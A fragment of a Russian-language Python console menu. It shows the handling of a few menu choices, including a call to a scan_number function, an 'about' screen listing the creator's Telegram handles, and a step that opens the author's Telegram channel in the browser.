            print(f'{COLOR_CODE["GREEN"]}[+]{COLOR_CODE["RESET"]} {message}')
            input(f'\n{COLOR_CODE["RED"]}└{COLOR_CODE["RESET"]} Нажмите Enter для чтобы вернуться в меню')
            cls()

        elif select == "21":
            scan_number()

        elif select == '42':
            print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└ Информация о приложении:{COLOR_CODE["RESET"]}')
            print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}  ├ Version: 3.3{COLOR_CODE["RESET"]}')
            print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}  ├ Creator: @ElusiveW3b{COLOR_CODE["RESET"]}')
            print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}  ├ Managers: @MIHICTP_CMEPTI and @panichka_zero{COLOR_CODE["RESET"]}')
            print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}  └ Channel: https://t.me/WastedWorldSoft{COLOR_CODE["RESET"]}')
            webbrowser.open_new_tab("https://t.me/WastedWorldSoft")
            cls()
        else:
            Write.Print("└ Неверный выбор. Пожалуйста, попробуйте снова.", THEMES[current_theme])
            cls()
else:
    print("Вход не выполнен. Завершение программы.")
